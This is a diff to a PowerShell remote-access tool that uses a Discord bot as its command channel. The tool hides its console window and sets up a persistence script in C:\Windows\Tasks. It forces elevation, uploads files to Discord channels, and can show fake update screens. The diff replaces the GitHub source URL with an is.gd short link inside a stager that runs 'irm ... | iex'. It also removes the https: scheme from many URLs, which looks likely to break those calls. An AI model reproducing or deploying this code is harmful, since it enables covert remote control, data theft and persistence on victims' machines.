@@ -25,7 +25,7 @@ $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window whil
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
 $defaultstart = 0 # Option to start all jobs automatically upon running
-$parent = "https://raw.githubusercontent.com/xdep/USB-Rubber-Ducky/master/c2client.ps1" # parent script URL (for restarts and persistance)
+$parent = "https://is.gd/rWKbqM" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -45,7 +45,7 @@ Function GetFfmpeg{
     $Path = "$env:Temp\ffmpeg.exe"
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
-        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
+        $apiUrl = "//api.github.com/repos/GyanD/codexffmpeg/releases/latest"
         $wc = New-Object System.Net.WebClient           
         $wc.Headers.Add("User-Agent", "PowerShell")
         $response = $wc.DownloadString("$apiUrl")
@@ -71,14 +71,14 @@ Function NewChannelCategory{
     while (!($guildID)){    
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("Authorization", $headers.Authorization)    
-        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+        $response = $wc.DownloadString("//discord.com/api/v10/users/@me/guilds")
         $guilds = $response | ConvertFrom-Json
         foreach ($guild in $guilds) {
             $guildID = $guild.id
         }
         sleep 3
     }
-    $uri = "https://discord.com/api/guilds/$guildID/channels"
+    $uri = "//discord.com/api/guilds/$guildID/channels"
     $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
     $body = @{
         "name" = "$env:COMPUTERNAME"
@@ -101,12 +101,12 @@ param([string]$name)
     }    
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("Authorization", $headers.Authorization)    
-    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
+    $response = $wc.DownloadString("//discord.com/api/v10/users/@me/guilds")
     $guilds = $response | ConvertFrom-Json
     foreach ($guild in $guilds) {
         $guildID = $guild.id
     }
-    $uri = "https://discord.com/api/guilds/$guildID/channels"
+    $uri = "//discord.com/api/guilds/$guildID/channels"
     $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
     $body = @{
         "name" = "$name"
@@ -126,7 +126,7 @@ param([string]$name)
 function sendMsg {
     param([string]$Message,[string]$Embed)
 
-    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    $url = "//discord.com/api/v10/channels/$SessionID/messages"
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("Authorization", "Bot $token")
 
@@ -154,7 +154,7 @@ function sendMsg {
 function sendFile {
     param([string]$sendfilePath)
 
-    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
+    $url = "//discord.com/api/v10/channels/$SessionID/messages"
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", "Bot $token")
     if ($sendfilePath) {
@@ -410,7 +410,7 @@ param ([string]$Prefix)
     $data = Import-Csv $FileOut
     $data | ForEach-Object {
         $mac = $_.'MAC'
-        $apiUrl = "https://api.macvendors.com/$mac"
+        $apiUrl = "//api.macvendors.com/$mac"
         $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
         Start-Sleep -Seconds 1
         $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
@@ -458,7 +458,7 @@ Function NearbyWifi {
 Function FakeUpdate {
     $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
-WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
+WshShell.Run "chrome.exe --new-window -kiosk //fakeupdate.net/win8", 1, False
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
@@ -474,7 +474,7 @@ WshShell.SendKeys "{F11}"
 Function Windows93 {
     $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
-WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
+WshShell.Run "chrome.exe --new-window -kiosk //windows93.net", 1, False
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
@@ -490,7 +490,7 @@ WshShell.SendKeys "{F11}"
 Function WindowsIdiot {
     $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
-WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
+WshShell.Run "chrome.exe --new-window -kiosk //ygev.github.io/Trojan.JS.YouAreAnIdiot", 1, False
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
@@ -802,7 +802,7 @@ If Not WScript.Arguments.Named.Exists(`"elevate`") Then
     , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
   WScript.Quit
 End If
-WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://is.gd/rWKbqM | iex`", 0, True
 "@
     $pth = "C:\Windows\Tasks\service.vbs"
     $tobat | Out-File -FilePath $pth -Force
